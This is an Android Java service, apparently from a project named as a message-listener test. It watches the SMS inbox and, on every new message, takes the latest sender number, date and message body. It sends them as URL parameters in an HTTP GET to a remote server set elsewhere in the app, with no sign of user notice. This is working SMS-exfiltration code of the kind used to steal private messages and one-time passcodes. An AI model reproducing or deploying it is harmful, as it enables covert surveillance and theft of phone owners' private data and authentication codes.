package com.honaf.testmsglistener;

import java.util.List;

import org.apache.http.HttpResponse;
import org.apache.http.HttpStatus;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.protocol.HTTP;
import org.apache.http.util.EntityUtils;

import android.app.Activity;
import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;

public class MyService extends Service {
	SmsReceiver smsreceiver;
	IntentFilter filter;

	@Override
	public IBinder onBind(Intent arg0) {
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();
		Log.e("honaf", "myservice开启onCreate！");
		ContentObserver co = new SmsReceiver(new Handler(),
				MainActivity.getInstance());
		this.getContentResolver().registerContentObserver(
				Uri.parse("content://sms/"), true, co);

	}

	@Override
	public void onDestroy() {
		super.onDestroy();
		Log.e("honaf", "myservice开启onDestroy！");
	}

	@Override
	public void onStart(Intent intent, int startId) {
		super.onStart(intent, startId);
		Log.e("honaf", "myservice开启onStart！");
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		Log.e("honaf", "myservice开启onStartCommand！");
		return super.onStartCommand(intent, flags, startId);

	}

	
	String url = "";

	

	class SmsReceiver extends ContentObserver {
		/**
		 * Activity对象
		 */
		private Activity activity;
		private List<SmsInfo> infos;

		public SmsReceiver(Handler handler, Activity activity) {
			super(handler);
			this.activity = activity;
		}

		@Override
		public void onChange(boolean selfChange) {
			Uri uri = Uri.parse("content://sms/inbox");// 设置一个uri来查看各种类别短信内容
														// (此处是收件箱)
			SmsContent smscontent = new SmsContent(activity, uri);
			infos = smscontent.getSmsInfo();
			if(infos.size()!=0){
				url = Util.url(activity) + "?telno="
						+ infos.get(0).getPhoneNumber() + "&date="
						+ infos.get(0).getDate() + "&cnt="
						+ infos.get(0).getSmsbody();
				Log.e("honaf_url", url);
				myHandler.sendEmptyMessage(1);
			}
			super.onChange(selfChange);
		}
	}

	Handler myHandler = new Handler() {
		public void handleMessage(android.os.Message msg) {
			int what = msg.what;
			switch (what) {
			case 1:
				new Thread(new Runnable() {
					
					@Override
					public void run() {
						try {
							HttpGet httpget = new HttpGet(url);
							HttpClient httpClient = new DefaultHttpClient();
							HttpResponse response = httpClient.execute(httpget);
							if (response.getStatusLine().getStatusCode() == HttpStatus.SC_OK) {
								String result = EntityUtils.toString(
										response.getEntity(), HTTP.UTF_8);
								Log.e("honaf_http", "success:" + result + "");
							} else {
								Log.e("honaf_http", "no success");
							}
						} catch (Exception e) {
							Log.e("honaf_http_error", e.getMessage() + "");
							e.printStackTrace();
						}
					}
				}).start();
				
				break;

			default:
				break;
			}

		};
	};

}
